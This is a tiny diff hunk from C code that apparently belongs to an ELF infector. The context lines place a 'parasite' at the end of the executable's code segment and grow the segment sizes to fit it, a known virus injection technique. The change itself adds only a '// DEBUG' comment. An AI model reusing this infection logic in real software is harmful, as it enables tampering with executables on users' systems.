@@ -80,6 +80,7 @@ Elf64_Off GetPaddingSize(void *host_mapping) {
       parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
       phdr_entry->p_filesz += parasite_size;
       phdr_entry->p_memsz += parasite_size;
+      // DEBUG
     }
     if (CODE_SEGMENT_FOUND == 1 && phdr_entry->p_type == PT_LOAD &&
         phdr_entry->p_flags == (PF_R | PF_W)) {
